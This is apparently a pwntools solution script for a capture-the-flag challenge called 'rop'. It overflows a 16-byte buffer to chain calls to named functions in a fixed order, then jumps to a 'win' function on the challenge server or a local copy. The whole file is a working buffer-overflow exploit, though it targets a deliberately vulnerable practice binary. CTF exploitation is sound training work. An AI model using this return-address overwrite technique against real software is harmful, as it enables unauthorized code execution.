from pwn import *

e = ELF("./rop")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("ctf.umbccd.io", 4100)
else:
  p = process(e.path)

a = ["snobby_shores", "tilted_towers", "greasy_grove", "junk_junction", "lonely_lodge", "loot_lake", "dusty_depot"]

p.send("A" * 0x10 + p32(e.symbols[a[1]]) + p32(e.symbols["tryme"]))
p.send("A" * 0x10 + p32(e.symbols[a[3]]) + p32(e.symbols["tryme"]))
p.send("A" * 0x10 + p32(e.symbols[a[0]]) + p32(e.symbols["tryme"]))
p.send("A" * 0x10 + p32(e.symbols[a[2]]) + p32(e.symbols["tryme"]))
p.send("A" * 0x10 + p32(e.symbols[a[4]]) + p32(e.symbols["tryme"]))
p.send("A" * 0x10 + p32(e.symbols[a[6]]) + p32(e.symbols["tryme"]))
p.send("A" * 0x10 + p32(e.symbols[a[5]]) + p32(e.symbols["tryme"]))
p.sendline("A" * 0x10 + p32(e.symbols["win"]))

p.interactive()
